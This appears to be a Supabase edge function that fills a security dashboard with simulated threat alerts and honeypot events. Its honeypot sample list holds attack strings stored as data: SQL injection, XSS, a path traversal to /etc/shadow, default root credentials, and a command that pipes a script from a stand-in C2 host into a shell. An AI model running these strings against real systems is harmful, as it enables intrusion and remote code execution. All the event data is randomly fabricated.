import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

const threatTypes = [
  { type: 'DDoS Attack', module: 'IDS' },
  { type: 'Phishing URL', module: 'Phishing' },
  { type: 'Brute Force', module: 'IDS' },
  { type: 'Malware Detected', module: 'Malware' },
  { type: 'Zero-Day Anomaly', module: 'Anomaly' },
  { type: 'Abnormal Login', module: 'UBA' },
  { type: 'Honeypot Triggered', module: 'Honeypot' },
  { type: 'Port Scan', module: 'IDS' },
]

const riskLevels = ['low', 'medium', 'high', 'critical']
const explanations = [
  'Volumetric flood detected from distributed botnet. Multiple SYN packets targeting primary services.',
  'Suspicious URL with encoded redirect chain detected. Domain age under 24 hours.',
  'Multiple failed authentication attempts from single source. Pattern matches credential stuffing.',
  'Binary with obfuscated payload matched threat intelligence signatures.',
  'Traffic pattern deviates significantly from baseline. Unknown protocol behavior.',
  'Login from unrecognized device in anomalous geolocation.',
  'Attacker probed decoy endpoint. Payload captured for analysis.',
  'Sequential port scanning detected across multiple ranges from known anonymizing proxy.',
]

const honeypotPayloads = [
  { payload: "' OR 1=1 --", type: 'SQL Injection' },
  { payload: '<script>document.cookie</script>', type: 'XSS' },
  { payload: '../../etc/shadow', type: 'Path Traversal' },
  { payload: 'root:toor', type: 'Credential Stuffing' },
  { payload: 'curl http://c2.bad/shell.sh | sh', type: 'Remote Code Exec' },
]

function randomIp() {
  const a = Math.floor(Math.random() * 200) + 10
  const b = Math.floor(Math.random() * 255)
  return `${a}.${b}.xxx.xxx`
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }

  const supabase = createClient(
    Deno.env.get('SUPABASE_URL')!,
    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
  )

  // Generate a new threat event
  const threat = threatTypes[Math.floor(Math.random() * threatTypes.length)]
  const risk = riskLevels[Math.floor(Math.random() * riskLevels.length)]
  const confidence = Math.floor(Math.random() * 30) + 70

  // Get next alert ID
  const { count } = await supabase.from('threat_events').select('*', { count: 'exact', head: true })
  const alertId = `ALT-${String((count || 0) + 1).padStart(3, '0')}`

  const { error: insertError } = await supabase.from('threat_events').insert({
    alert_id: alertId,
    type: threat.type,
    module: threat.module,
    risk_level: risk,
    confidence,
    explanation: explanations[Math.floor(Math.random() * explanations.length)],
    source_ip: randomIp(),
    status: 'active',
  })

  // Update stats
  const { data: statsRows } = await supabase.from('threat_stats').select('*').limit(1)
  if (statsRows && statsRows.length > 0) {
    const s = statsRows[0]
    const blocked = Math.random() > 0.15 ? 1 : 0
    await supabase.from('threat_stats').update({
      total_threats: s.total_threats + 1,
      blocked_attacks: s.blocked_attacks + blocked,
      active_alerts: s.active_alerts + (blocked ? 0 : 1),
      risk_score: Math.min(100, Math.max(0, s.risk_score + Math.floor(Math.random() * 7) - 3)),
      updated_at: new Date().toISOString(),
    }).eq('id', s.id)
  }

  // 30% chance of honeypot event
  if (Math.random() < 0.3) {
    const hp = honeypotPayloads[Math.floor(Math.random() * honeypotPayloads.length)]
    await supabase.from('honeypot_events').insert({
      ip_address: randomIp(),
      payload: hp.payload,
      attempt_type: hp.type,
      attempts: Math.floor(Math.random() * 50) + 1,
    })
  }

  return new Response(JSON.stringify({ success: true, alert_id: alertId }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  })
})
